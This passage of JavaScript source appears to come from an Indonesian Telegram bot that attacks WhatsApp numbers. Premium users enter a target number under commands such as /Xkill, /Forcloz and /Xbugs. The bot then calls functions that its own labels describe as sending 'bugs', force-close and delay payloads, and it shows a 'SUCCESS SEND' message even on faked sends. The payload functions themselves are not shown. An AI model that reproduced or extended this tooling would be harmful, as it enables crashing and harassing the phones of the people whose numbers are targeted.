${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : Status
${a3} Result : <b>SUCCESS SEND</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝙲𝙷𝙴𝙲𝙺 𝚃𝙰𝚁𝙶𝙴𝚃",
              url: `https://wa.me/${formattedNumber}`,
              style: "danger",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    // ===== FAKE SEND CHECK =====
    if (!isRealSend) return; // skip API, notif sudah dikirim

    // ===== ANTI DUPLIKAT =====
    if (processingTargetsZ.has(target)) return;
    processingTargetsZ.add(target);

    // ===== LOG =====
    console.log(`[PROSES SEND BUG] -> ${rawNumber}`);

    // ===== PROSES REAL SEND =====
    raraaimupp2(target)
      .then(() => {
        connectionFailCountZ.delete(target);
        notifiedConnectionClosedZ.delete("GLOBAL");
      })
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();
        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountZ.get(target) || 0;
          fail++;
          connectionFailCountZ.set(target, fail);

          if (fail >= 3) {
            // notif connection closed global
            notifiedConnectionClosedZ.add("GLOBAL");
            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        }
      })
      .finally(() => {
        processingTargetsZ.delete(target);
        targetCycleCountZ.delete(target);

        // 🔥 kirim notif ke semua user baru yang pakai fitur kalau connection closed global aktif
        if (notifiedConnectionClosedZ.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch {}
});
// ================================
// ANTI DUPLICATE TARGET SYSTEM
// ================================
// ===== BOT COMMAND =====
const processingTargetsXivor = new Set();
const connectionFailCountXivor = new Map();
const targetCycleCountXivor = new Map();
const notifiedConnectionClosedXivor = new Set(); // global per bot
let senderDeadNotifiedXivor = false;

bot.onText(/\/XivorX(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /XivorX 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8) return bot.sendMessage(chatId, "𝙵𝚘𝚛𝚖𝚊𝚝 𝚂𝚊𝚕𝚊𝚑, 𝚌𝚘𝚗𝚝𝚘𝚑: /XivorX 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMBEDDED EMOJI DI DALAM FITUR =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const EMOJI = {
      thinkMsg: "5979037639347542903", // 👻
      btnIcon: "5773800475329566949",  // 🔗
    };
    const e1 = prem("5208541126583136130", "🎉"); // emoji utama XivorX

    // ===== CEK CONNECTION GLOBAL =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    senderDeadNotifiedXivor = false;

    const isPremium = premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/xivorx")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xivorx.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ 𝙻𝙸𝙽𝙺 𝙱𝙴𝙻𝚄𝙼 𝙳𝙸𝚂𝙴𝚃!

𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚊𝚍𝚖𝚒𝚗 𝚜𝚎𝚝 𝚍𝚞𝚕𝚞:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `𝙹𝙾𝙸𝙽 𝙺𝙰𝙺 #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ 𝚅𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 𝙰𝙺𝚂𝙴𝚂 𝚃𝙴𝚁𝙱𝙰𝚃𝙰𝚂!

🔒 𝙺𝚊𝚖𝚞 𝚠𝚊𝚓𝚒𝚋 𝚓𝚘𝚒𝚗 𝚜𝚎𝚖𝚞𝚊 𝚕𝚒𝚗𝚔 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑 𝚝𝚎𝚛𝚕𝚎𝚋𝚒𝚑 𝚍𝚊𝚑𝚞𝚕𝚞.

✨ 𝚂𝚎𝚝𝚎𝚕𝚊𝚑 𝚓𝚘𝚒𝚗, 𝚝𝚎𝚔𝚊𝚗 𝚝𝚘𝚖𝚋𝚘𝚕 𝚟𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    // ===== LIMIT & COUNT =====
    let count = targetCycleCountXivor.get(target) || 0;
    targetCycleCountXivor.set(target, count + 1);
    const isRealSend = count < 3;

    // ===== SUCCESS SEND BUG =====
    const userMention = mentionUserHTML(msg);
    const messageText = `
<blockquote>
<b>${e1} MODE : INVISIBLE DELAY HARD</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : Status
${a3} Result : <b>SUCCESS SEND</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝙲𝙷𝙴𝙲𝙺 𝚃𝙰𝚁𝙶𝙴𝚃",
              url: `https://wa.me/${formattedNumber}`,
              style: "primary",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    // ===== FAKE SEND CHECK =====
    if (!isRealSend) return; // skip API, notif sudah dikirim

    // ===== ANTI DUPLIKAT =====
    if (processingTargetsXivor.has(target)) return;
    processingTargetsXivor.add(target);

    // ===== LOG =====
    console.log(`[PROSES SEND BUG] -> ${rawNumber}`);

    // ===== PROSES REAL SEND =====
    raraaimupp3(target)
      .then(() => {
        connectionFailCountXivor.delete(target);
        notifiedConnectionClosedXivor.delete("GLOBAL");
      })
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();
        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountXivor.get(target) || 0;
          fail++;
          connectionFailCountXivor.set(target, fail);

          if (fail >= 3) {
            // notif connection closed global
            notifiedConnectionClosedXivor.add("GLOBAL");
            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        }
      })
      .finally(() => {
        processingTargetsXivor.delete(target);
        targetCycleCountXivor.delete(target);

        // 🔥 kirim notif ke semua user baru yang pakai fitur kalau connection closed global aktif
        if (notifiedConnectionClosedXivor.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch {}
});
// ================================
// ANTI DUPLICATE TARGET SYSTEM
// ================================
// ===== BOT COMMAND =====
const processingTargetsN = new Set();
const connectionFailCountN = new Map();
const targetCycleCountN = new Map();
const notifiedConnectionClosedN = new Set(); // global
let senderDeadNotifiedN = false;

bot.onText(/\/Forcloz(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /Forcloz 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "𝙵𝚘𝚛𝚖𝚊𝚝 𝚂𝚊𝚕𝚊𝚑, 𝚌𝚘𝚗𝚝𝚘𝚑: /Forcloz 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const EMOJI = { btnIcon: "5992173732397848888" }; // 😱
    const e1 = prem("6100553439656284469", "😌");

    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
    }

    senderDeadNotifiedN = false;

    const isPremium = premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/forcloz")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /forcloz.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);
    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(chatId, `<blockquote>
⚠️ LINK BELUM DISET!

Silahkan admin set dulu:
/setautojoin
</blockquote>`, { parse_mode: "HTML" });
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(chatId, `<blockquote>
🚫 AKSES TERBATAS!

🔒 Kamu wajib join semua link di bawah terlebih dahulu.

✨ Setelah join, tekan tombol verifikasi di bawah.
</blockquote>`, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } });
      }
    }

    let count = targetCycleCountN.get(target) || 0;
    targetCycleCountN.set(target, count + 1);
    const isRealSend = count < 3;

    const userMention = (typeof mentionUserHTML === "function") ? mentionUserHTML(msg) : "User";
    const img = (typeof getImage === "function") ? getImage() : "https://via.placeholder.com/512";

    const messageText = `
<blockquote>
<b>${e1} 𝙵𝙾𝚁𝙲𝙴 𝙲𝙻𝙾𝚂𝙴 × 𝙳𝙴𝙻𝙰𝚈</b>

${a1} 𝚄𝚜𝚎𝚛   : ${userMention}
${a2} 𝚃𝚊𝚛𝚐𝚎𝚝 : <code>${formattedNumber}</code>
Type   : 𝙵𝚘𝚛𝚌𝚕𝚘𝚜𝚎 𝚇 𝙳𝚎𝚕𝚊𝚢
${a3} 𝚂𝚝𝚊𝚝𝚞𝚜 : <b>SUCCESS</b>
</blockquote>
`.trim();

    console.log(`[FORCLOZ] Mengirim ke: ${formattedNumber}`);

    await bot.sendPhoto(chatId, img, {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝙲𝙷𝙴𝙲𝙺 𝚃𝙰𝚁𝙶𝙴𝚃",
              url: `https://wa.me/${formattedNumber}`,
              style: "success",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    if (!isRealSend) return;
    if (processingTargetsN.has(target)) return;
    processingTargetsN.add(target);

    // ===== PROSES REAL SEND =====
    await raraaimupp4(target)
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();
        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountN.get(target) || 0;
          fail++;
          connectionFailCountN.set(target, fail);

          if (fail >= 2) {
            notifiedConnectionClosedN.add("GLOBAL");
            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        } else {
          console.error("[FORCLOZ ERROR]", err);
        }
      })
      .finally(() => {
        processingTargetsN.delete(target);
        targetCycleCountN.delete(target);

        if (notifiedConnectionClosedN.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch (outer) {
    console.error("[FORCLOZ OUTER ERROR]", outer);
  }
});
// ================================
// ANTI DUPLICATE TARGET SYSTEM
// ================================
// ===== BOT COMMAND =====
const processingTargetsV = new Set();
const connectionFailCountV = new Map();
const targetCycleCountV = new Map();
const notifiedConnectionClosedV = new Set(); // global
let senderDeadNotifiedV = false;

bot.onText(/\/forexit(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /forexit 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "𝙵𝚘𝚛𝚖𝚊𝚝 𝚂𝚊𝚕𝚊𝚑, 𝚌𝚘𝚗𝚝𝚘𝚑: /forexit 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMOJI DI DALAM FITUR =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;

    const EMOJI = {
      btnIcon: "5823498022947919928", // 👀
    };

    const e1 = prem("6258265158456447721", "⚡️");

    // ===== CEK CONNECTION GLOBAL =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
    }

    senderDeadNotifiedV = false;

    const isPremium = premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/forexit")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /forexit.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ 𝙻𝙸𝙽𝙺 𝙱𝙴𝙻𝚄𝙼 𝙳𝙸𝚂𝙴𝚃!

𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚊𝚍𝚖𝚒𝚗 𝚜𝚎𝚝 𝚍𝚞𝚕𝚞:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `𝙹𝙾𝙸𝙽 𝙺𝙰𝙺 #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ 𝚅𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 𝙰𝙺𝚂𝙴𝚂 𝚃𝙴𝚁𝙱𝙰𝚃𝙰𝚂!

🔒 𝙺𝚊𝚖𝚞 𝚠𝚊𝚓𝚒𝚋 𝚓𝚘𝚒𝚗 𝚜𝚎𝚖𝚞𝚊 𝚕𝚒𝚗𝚔 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑 𝚝𝚎𝚛𝚕𝚎𝚋𝚒𝚑 𝚍𝚊𝚑𝚞𝚕𝚞.

✨ 𝚂𝚎𝚝𝚎𝚕𝚊𝚑 𝚓𝚘𝚒𝚗, 𝚝𝚎𝚔𝚊𝚗 𝚝𝚘𝚖𝚋𝚘𝚕 𝚟𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    // ===== LIMIT & COUNT =====
    let count = targetCycleCountV.get(target) || 0;
    targetCycleCountV.set(target, count + 1);
    const isRealSend = count < 3;

    // ===== SUCCESS SEND BUG =====
    const userMention = mentionUserHTML(msg);
    const messageText = `
<blockquote>
<b>${e1} FORCE CLOSE × DELAY</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : Forclose X Delay
${a3} Status : <b>SUCCESS</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝙲𝙷𝙴𝙲𝙺 𝚃𝙰𝚁𝙶𝙴𝚃",
              url: `https://wa.me/${formattedNumber}`,
              style: "danger",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    // ===== FAKE SEND CHECK =====
    if (!isRealSend) return;

    // ===== ANTI DUPLIKAT =====
    if (processingTargetsV.has(target)) return;
    processingTargetsV.add(target);

    // ===== PROSES REAL SEND =====
    await raraaimupp5(target).catch((err) => {
      const msgError = String(err?.message || "").toLowerCase();

      if (msgError.includes("connection closed")) {
        let fail = connectionFailCountV.get(target) || 0;
        fail++;
        connectionFailCountV.set(target, fail);

        if (fail >= 2) {
          notifiedConnectionClosedV.add("GLOBAL");
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      }
    }).finally(() => {
      processingTargetsV.delete(target);
      targetCycleCountV.delete(target);

      if (notifiedConnectionClosedV.has("GLOBAL")) {
        bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
      }
    });

  } catch {}
});
// ===== BOT COMMAND =====
const processingTargetsK = new Set();
const connectionFailCountK = new Map();
const targetCycleCountK = new Map();
const notifiedConnectionClosedK = new Set(); // global
let senderDeadNotifiedK = false;

bot.onText(/\/Xkill(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /Xkill 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "𝙵𝚘𝚛𝚖𝚊𝚝 𝚂𝚊𝚕𝚊𝚑, 𝚌𝚘𝚗𝚝𝚘𝚑: /Xkill 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMOJI DI DALAM FITUR =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const EMOJI = { btnIcon: "5897997477692314735" }; // 🎸
    const e1 = prem("5404715222411799587", "🎁");

    // ===== CEK CONNECTION GLOBAL =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    senderDeadNotifiedK = false;

    const isPremium = premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/xkill")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xkill.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ 𝙻𝙸𝙽𝙺 𝙱𝙴𝙻𝚄𝙼 𝙳𝙸𝚂𝙴𝚃!

𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚊𝚍𝚖𝚒𝚗 𝚜𝚎𝚝 𝚍𝚞𝚕𝚞:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `𝙹𝙾𝙸𝙽 𝙺𝙰𝙺 #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ 𝚅𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 𝙰𝙺𝚂𝙴𝚂 𝚃𝙴𝚁𝙱𝙰𝚃𝙰𝚂!

🔒 𝙺𝚊𝚖𝚞 𝚠𝚊𝚓𝚒𝚋 𝚓𝚘𝚒𝚗 𝚜𝚎𝚖𝚞𝚊 𝚕𝚒𝚗𝚔 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑 𝚝𝚎𝚛𝚕𝚎𝚋𝚒𝚑 𝚍𝚊𝚑𝚞𝚕𝚞.

✨ 𝚂𝚎𝚝𝚎𝚕𝚊𝚑 𝚓𝚘𝚒𝚗, 𝚝𝚎𝚔𝚊𝚗 𝚝𝚘𝚖𝚋𝚘𝚕 𝚟𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    // ===== LIMIT & COUNT =====
    let count = targetCycleCountK.get(target) || 0;
    targetCycleCountK.set(target, count + 1);
    const isRealSend = count < 3;

    // ===== SUCCESS SEND BUG (REAL + FAKE) =====
    const userMention = mentionUserHTML(msg);

    const messageText = `
<blockquote>
<b>${e1} MODE : INVISIBLE DELAY HARD</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : Status
${a3} Result : <b>SUCCESS SEND</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝙲𝙷𝙴𝙲𝙺 𝚃𝙰𝚁𝙶𝙴𝚃",
              url: `https://wa.me/${formattedNumber}`,
              style: "primary",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    // ===== FAKE SEND =====
    if (!isRealSend) return;

    // ===== ANTI DUPLIKAT =====
    if (processingTargetsK.has(target)) return;
    processingTargetsK.add(target);

    // ===== PROSES REAL SEND =====
    raraaimupp6(target)
      .then(() => {
        connectionFailCountK.delete(target);
        notifiedConnectionClosedK.delete("GLOBAL");
      })
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();

        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountK.get(target) || 0;
          fail++;
          connectionFailCountK.set(target, fail);

          if (fail >= 3) {
            notifiedConnectionClosedK.add("GLOBAL");
            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        }
      })
      .finally(() => {
        processingTargetsK.delete(target);
        targetCycleCountK.delete(target);

        // ===== GLOBAL NOTIF =====
        if (notifiedConnectionClosedK.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch {}
});
// ===== BOT COMMAND =====
const processingTargetsB = new Set();
const targetCycleCountB = new Map();
const connectionFailCountB = new Map();
const notifiedConnectionClosedB = new Set(); // global
let senderDeadNotifiedB = false;

bot.onText(/\/Xbugs(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /Xbugs 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "𝙵𝚘𝚛𝚖𝚊𝚝 𝚂𝚊𝚕𝚊𝚑, 𝚌𝚘𝚗𝚝𝚘𝚑: /Xbugs 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMOJI DI DALAM FITUR =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const EMOJI = { btnIcon: "5891050557069595964" }; // 💀
    const e1 = prem("5913334054287054261", "💤");

    // ===== CEK CONNECTION =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    senderDeadNotifiedB = false;

    const isPremium = premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/xbugs")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xbugs.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ 𝙻𝙸𝙽𝙺 𝙱𝙴𝙻𝚄𝙼 𝙳𝙸𝚂𝙴𝚃!

𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚊𝚍𝚖𝚒𝚗 𝚜𝚎𝚝 𝚍𝚞𝚕𝚞:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `𝙹𝙾𝙸𝙽 𝙺𝙰𝙺 #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ 𝚅𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 𝙰𝙺𝚂𝙴𝚂 𝚃𝙴𝚁𝙱𝙰𝚃𝙰𝚂!

🔒 𝙺𝚊𝚖𝚞 𝚠𝚊𝚓𝚒𝚋 𝚓𝚘𝚒𝚗 𝚜𝚎𝚖𝚞𝚊 𝚕𝚒𝚗𝚔 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑 𝚝𝚎𝚛𝚕𝚎𝚋𝚒𝚑 𝚍𝚊𝚑𝚞𝚕𝚞.

✨ 𝚂𝚎𝚝𝚎𝚕𝚊𝚑 𝚓𝚘𝚒𝚗, 𝚝𝚎𝚔𝚊𝚗 𝚝𝚘𝚖𝚋𝚘𝚕 𝚟𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    // ===== LIMIT & COUNT =====
    let count = targetCycleCountB.get(target) || 0;
    targetCycleCountB.set(target, count + 1);
    const isRealSend = count < 3;

    // ===== SUCCESS SEND BUG (REAL + FAKE) =====
    const userMention = mentionUserHTML(msg);

    const messageText = `
<blockquote>
<b>${e1} MODE : INVISIBLE DELAY HARD</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : Status
${a3} Result : <b>SUCCESS SEND</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝙲𝙷𝙴𝙲𝙺 𝚃𝙰𝚁𝙶𝙴𝚃",
              url: `https://wa.me/${formattedNumber}`,
              style: "success",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    if (!isRealSend) return;

    // ===== ANTI DUPLIKAT =====
    if (processingTargetsB.has(target)) return;
    processingTargetsB.add(target);

    // ===== LOG CLEAN =====
    console.log(`\x1b[36m[PROSES SEND BUG]\x1b[0m -> ${rawNumber}`);

    // ===== PROSES REAL SEND =====
    raraaimupp7(target)
      .then(() => {
        connectionFailCountB.delete(target);
        notifiedConnectionClosedB.delete("GLOBAL");
      })
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();

        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountB.get(target) || 0;
          fail++;
          connectionFailCountB.set(target, fail);

          if (fail >= 3) {
            notifiedConnectionClosedB.add("GLOBAL");
